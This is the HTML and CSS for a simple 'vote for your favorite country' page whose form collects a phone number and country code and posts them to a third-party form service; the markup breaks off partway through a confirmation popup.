<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Voting Website</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .voting-container {
      background-color: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
      text-align: center;
      max-width: 400px;
      width: 100%;
    }

    h2 {
      color: #007bff;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    label {
      display: block;
      margin: 10px 0;
      font-weight: bold;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      box-sizing: border-box;
    }

    button {
      padding: 12px;
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #0056b3;
    }

    .confirmation-popup {
      display: none;
      background-color: rgba(0, 123, 255, 0.8);
      color: #fff;
      padding: 20px;
      border-radius: 8px;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 1000;
      text-align: center;
    }

    .confirmation-image {
      width: 60px;
      margin-bottom: 15px;
    }
  </style>
</head>
<body>

  <div class="voting-container">
    <h2>Vote for Your Favorite Country</h2>

    <form id="votingForm" action="https://submit-form.com/QT7UUnl6y">
      <label for="phoneNumber">Phone Number:</label>
      <input type="text" id="phoneNumber" name="phoneNumber" placeholder="Enter your phone number" required>

      <label for="countryCode">Country Code:</label>
      <select id="countryCode" name="countryCode">
        <option value="+1">+1 (USA)</option>
        <option value="+44">+44 (UK)</option>
        <option value="+91">+91 (India)</option>
        <!-- Add more countries as needed -->
      </select>

      <button type="button" onclick="verifyVote()">Verify Vote</button>
    </form>

    <div class="confirmation-popup" id="confirmationPopup">
      <img src="https://image.flaticon.com/icons/png/512/845/845646.png" alt="Checkmark" class="confirmation-image">
